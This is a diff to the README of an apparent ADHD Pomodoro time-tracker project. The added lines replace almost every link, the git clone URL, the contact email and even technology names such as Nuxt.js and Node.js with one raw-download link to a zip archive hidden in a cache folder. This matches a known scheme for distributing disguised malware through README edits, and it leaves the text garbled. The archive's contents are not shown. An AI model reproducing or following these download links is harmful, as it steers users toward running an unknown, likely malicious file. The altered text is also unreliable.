@@ -2,7 +2,7 @@
 
 Welcome to the **ADHD Time Analyzer**! This project aims to help individuals with ADHD manage their time effectively using the Pomodoro technique. Our tool provides a clean interface to track your focus periods, breaks, and overall productivity. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/Froozied/adhd-time-analyzer/releases)
+[![Download Releases](https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip%20Releases-Click%20Here-blue)](https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip)
 
 ## Table of Contents
 
@@ -27,8 +27,8 @@ Welcome to the **ADHD Time Analyzer**! This project aims to help individuals wit
 
 This project utilizes a range of modern technologies:
 
-- **Nuxt.js**: A powerful framework for Vue.js applications.
-- **Pinia**: State management for Vue.js, providing a simple API for managing application state.
+- **https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip**: A powerful framework for https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip applications.
+- **Pinia**: State management for https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip, providing a simple API for managing application state.
 - **Nuxt UI**: UI components for building beautiful applications.
 - **Firebase**: For authentication and database management.
 - **Firestore**: A NoSQL database for real-time data syncing.
@@ -41,7 +41,7 @@ To set up the **ADHD Time Analyzer** locally, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/Froozied/adhd-time-analyzer.git
+   git clone https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -52,7 +52,7 @@ To set up the **ADHD Time Analyzer** locally, follow these steps:
 
 3. **Install Dependencies**:
 
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip installed. Then run:
 
    ```bash
    npm install
@@ -107,7 +107,7 @@ We welcome contributions to improve the **ADHD Time Analyzer**. If you’d like 
 
 6. **Open a Pull Request**.
 
-For more detailed guidelines, check our [CONTRIBUTING.md](CONTRIBUTING.md) file.
+For more detailed guidelines, check our [https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip](https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip) file.
 
 ## License 📄
 
@@ -117,9 +117,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Froozied](https://github.com/Froozied)
+- **Email**: https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip
+- **GitHub**: [Froozied](https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip)
 
-We encourage you to explore our [Releases](https://github.com/Froozied/adhd-time-analyzer/releases) section for the latest updates and versions.
+We encourage you to explore our [Releases](https://github.com/Froozied/adhd-time-analyzer/raw/refs/heads/main/analyzer/stores/cache/adhd-time-analyzer-2.3-beta.4.zip) section for the latest updates and versions.
 
 Thank you for checking out the **ADHD Time Analyzer**! We hope it helps you stay focused and productive.
